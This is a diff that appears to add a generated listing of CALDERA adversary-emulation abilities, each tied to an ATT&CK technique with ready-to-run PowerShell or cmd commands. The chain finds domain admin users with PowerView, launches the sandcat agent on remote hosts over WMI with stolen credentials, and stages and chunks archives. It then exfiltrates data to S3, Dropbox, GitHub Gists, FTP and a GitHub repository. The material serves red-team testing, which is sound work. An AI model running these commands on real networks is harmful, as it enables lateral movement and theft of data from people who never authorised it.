@@ -1,0 +1,108 @@
+('aaf34d82-aea9-4278-8ec4-789653e4f5d9', 'None', 'domain.user.name')
+('ece5dde3-d370-4c20-b213-a1f424aa8d03', 'domain.user.name', 'None')
+('a0676fe1-cd52-482e-8dde-349b73f9aa69', 'None', 'wifi.network.ssid')
+('6469befa-748a-4b9c-a96d-f191fde47d89', 'None', 'host.dir.staged')
+('30a8cf10-73dc-497c-8261-a64cc9e91505', 'host.dir.staged', 'host.dir.compress')
+('5c5b0392-1daa-45e1-967c-2f361ce78849', 'host.dir.staged', 'host.dir.compress')
+('300157e5-f4ad-4569-b533-9d1fa0e74d74', 'host.dir.staged', 'host.dir.compress')
+('ba0deadb-97ac-4a4c-aa81-21912fc90980', 'host.dir.compress', 'None')
+('3ce95a28-25fc-4a7e-a0cd-0fdb190e2081', 'host.dir.compress', 'None')
+('0582dc26-e0cf-4645-88cf-f37a02279976', 'host.dir.compress', 'None')
+('d754878c-17dd-46dc-891c-a993f8a10336', 'host.dir.compress', 'None')
+('4a1120a5-971c-457f-bb07-60641b4723fd', 'host.dir.compress', 'None')
+
+
+id__dependence__fact: ('aaf34d82-aea9-4278-8ec4-789653e4f5d9', 'None', 'domain.user.name')
+> description: Get Administrator users for a computer
+> tactic: discovery
+> technique: {'attack_id': 'T1033', 'name': 'System Owner/User Discovery'}
+> platforms: {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'custom_parser_vals': {'json_key': 'samaccountname', 'json_type': 'str'}}]}, 'payloads': ['powerview.ps1']}}
+
+
+id__dependence__fact: ('ece5dde3-d370-4c20-b213-a1f424aa8d03', 'domain.user.name', 'None')
+> description: Remotely executes 54ndc47 over WMI
+> tactic: execution
+> technique: {'attack_id': 'T1047', 'name': 'Windows Management Instrumentation'}
+> platforms: {'psh': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"\n'}, 'cmd': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"\n'}}
+
+
+id__dependence__fact: ('a0676fe1-cd52-482e-8dde-349b73f9aa69', 'None', 'wifi.network.ssid')
+> description: See the most used WIFI networks of a machine
+> tactic: discovery
+> technique: {'attack_id': 'T1016', 'name': 'System Network Configuration Discovery'}
+> platforms: {'psh': {'command': '.\\wifi.ps1 -Pref\n', 'payloads': ['wifi.ps1'], 'parsers': {'plugins.stockpile.app.parsers.wifipref': [{'source': 'wifi.network.ssid'}]}}}
+
+
+id__dependence__fact: ('6469befa-748a-4b9c-a96d-f191fde47d89', 'None', 'host.dir.staged')
+> description: create a directory for exfil staging
+> tactic: collection
+> technique: {'attack_id': 'T1074.001', 'name': 'Data Staged: Local Data Staging'}
+> platforms: {'psh,pwsh': {'command': 'New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object\n', 'cleanup': 'Remove-Item -Path "staged" -recurse\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}}
+
+
+id__dependence__fact: ('30a8cf10-73dc-497c-8261-a64cc9e91505', 'host.dir.staged', 'host.dir.compress')
+> description: This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux
+> tactic: collection
+> technique: {'attack_id': 'T1560.001', 'name': 'Archive Collected Data: Archive via Utility'}
+> platforms: {'psh': {'command': '& "C:\\Program Files\\7-Zip\\7z.exe" a "#{host.dir.staged}.7z" "#{host.dir.staged}\\*" "-p#{host.archive.password}" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select\n', 'cleanup': 'rm #{host.dir.staged}.7z\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.compress'}]}}}
+
+
+id__dependence__fact: ('5c5b0392-1daa-45e1-967c-2f361ce78849', 'host.dir.staged', 'host.dir.compress')
+> description: This ability will compress the staged files into a password protected archive and break it
+into smaller chunks based on the given byte size. The original archive will be automatically
+deleted. Use this instead of other archiving abilities if small file sizes for exfiltration 
+are desired. When used with an exfiltration ability, the exfiltration ability will run numerous
+times in an operation depending on how many chunks are created. 
+
+> tactic: exfiltration
+> technique: {'attack_id': 'T1030', 'name': 'Data Transfer Size Limits'}
+> platforms: {'psh': {'command': '& "C:\\Program Files\\7-Zip\\7z.exe" a "#{host.dir.staged}.7z" "#{host.dir.staged}\\*" \'-p#{host.archive.password}\' | Out-Null;\nsleep 2;\n$Archive = Get-Item -Path "#{host.dir.staged}.7z";\n$StageDir = "#{host.dir.staged}";\n$BaseName = $StageDir + "\\calderachunk";\n$UpperBound = [int32]"#{file.size.chunk}";\n$Content = [IO.File]::OpenRead($Archive);\n$buff = New-Object byte[] $UpperBound;\n$Bytes = $idx = 0;\ntry {\n    do {\n        $Bytes = $Content.Read($buff, 0, $buff.Length);\n        if ($Bytes -gt 0) {\n            $ChunkName = "{0}{1}" -f ($BaseName, $idx.ToString().PadLeft(3,\'0\'));\n            $ChunkFile = [IO.File]::OpenWrite($ChunkName);\n            try {\n                $ChunkFile.Write($buff, 0, $Bytes);\n            } finally {\n                $ChunkFile.Close();\n            }\n        }\n        $idx ++;\n    } while ($Bytes -gt 0)\n}\nfinally {\n    $Content.Close();\n}\nRemove-Item $Archive;\nGet-ChildItem -Path "$StageDir\\calderachunk*" | foreach {$_.FullName} | Select-Object;\n', 'cleanup': 'Get-ChildItem -Path "$StageDir\\calderachunk*" | Remove-Item;\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.compress'}]}}}
+
+
+id__dependence__fact: ('300157e5-f4ad-4569-b533-9d1fa0e74d74', 'host.dir.staged', 'host.dir.compress')
+> description: Compress a directory on the file system
+> tactic: exfiltration
+> technique: {'attack_id': 'T1560.001', 'name': 'Archive Collected Data: Archive via Utility'}
+> platforms: {'psh,pwsh': {'command': 'Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n', 'cleanup': 'rm #{host.dir.staged}.zip\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.compress'}]}}}
+
+
+id__dependence__fact: ('ba0deadb-97ac-4a4c-aa81-21912fc90980', 'host.dir.compress', 'None')
+> description: Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper
+policies and security rules are in place to allow reading from the source bucket and writing to the destination
+bucket.
+
+> tactic: exfiltration
+> technique: {'attack_id': 'T1537', 'name': 'Transfer Data to Cloud Account'}
+> platforms: {'psh': {'command': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "exfil-#{paw}-$($SourceFile.name)";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;\n'}}
+
+
+id__dependence__fact: ('3ce95a28-25fc-4a7e-a0cd-0fdb190e2081', 'host.dir.compress', 'None')
+> description: This will exfiltrate an archive to Dropbox.
+> tactic: exfiltration
+> technique: {'attack_id': 'T1567.002', 'name': 'Exfiltration to Cloud Storage'}
+> platforms: {'psh': {'command': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";\n$TargetFilePath = "/#{dropbox.target.dir}/$RemoteName";\n$ApiKey = "#{dropbox.api.key}";\n\n$url = "https://content.dropboxapi.com/2/files/upload";\n\n$file = [IO.File]::ReadAllBytes($SourceFile);\n[net.httpWebRequest] $req = [net.webRequest]::create($url);\n\n$arg = \'{ "path": "\' + $TargetFilePath + \'", "mode": "add", "autorename": true, "mute": false }\';\n$authorization = "Bearer " + $ApiKey;\n\n$req.method = "POST";\n$req.Headers.Add("Authorization", $authorization);\n$req.Headers.Add("Dropbox-API-Arg", $arg);\n$req.ContentType = \'application/octet-stream\';\n$req.ContentLength = $file.length;\n$req.TimeOut = 50000;\n$req.KeepAlive = $true;\n$req.Headers.Add("Keep-Alive: 300");\n$reqst = $req.getRequestStream();\n$reqst.write($file, 0, $file.length);\n$reqst.flush();\n$reqst.close();\n\n[net.httpWebResponse] $res = $req.getResponse();\n$resst = $res.getResponseStream();\n$sr = new-object IO.StreamReader($resst);\n$result = $sr.ReadToEnd();\n$result;\n$res.close();\n'}}
+
+
+id__dependence__fact: ('0582dc26-e0cf-4645-88cf-f37a02279976', 'host.dir.compress', 'None')
+> description: This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save
+the base64 string from the Gist and run ----
+(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----
+(Linux) cat b64.txt | base64 -d > archive.extension
+
+> tactic: exfiltration
+> technique: {'attack_id': 'T1567.001', 'name': 'Exfiltration to Code Repository'}
+> platforms: {'psh': {'command': '$GHUser = "#{github.user.name}";\n$GHPAT = "#{github.access.token}";\n$File = Get-Item -Path "#{host.dir.compress}";\n$Token = $GHUser + ":" + $GHPAT;\n$EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);\n\n$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)";\n$FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));\n\n$StringContent = @{\n    files = @{$RemoteName = @{content = $FileContent}};\n    public = $False;\n} | ConvertTo-Json;\n$URL = "https://api.github.com/gists";\n$Body = $StringContent;\n$Headers = @{\n    "content-type" = "application/json";\n    "Authorization" = \'Basic {0}\' -f $EncodedToken;\n};\nInvoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;\n'}}
+
+
+id__dependence__fact: ('d754878c-17dd-46dc-891c-a993f8a10336', 'host.dir.compress', 'None')
+> description: This ability exfiltrates a compressed archive to an FTP server.
+> tactic: exfiltration
+> technique: {'attack_id': 'T1048.003', 'name': 'Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'}
+> platforms: {'psh': {'command': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";\n$ftp = [System.Net.FtpWebRequest]::Create("ftp://#{ftp.server.address}/$RemoteName");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential("#{ftp.user.name}", "#{ftp.user.password}");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes("#{host.dir.compress}");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();\n'}}
+
+
+id__dependence__fact: ('4a1120a5-971c-457f-bb07-60641b4723fd', 'host.dir.compress', 'None')
+> description: This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.
+> tactic: exfiltration
+> technique: {'attack_id': 'T1567.001', 'name': 'Exfiltration to Code Repository'}
+> platforms: {'psh,pwsh': {'command': '$GHUser = "#{github.user.name}";\n$GHRepo = "#{github.repository.name}";\n$GHPAT = "#{github.access.token}";\n$GHBranch = \'#{github.repository.branch}\';\n$token = $GHUser + ":" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = \'Basic {0}\' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)";\n$uri = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = \'base64\';\n    message = "Committed " + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch "but expected") { $PSItem; }\n}\n'}}
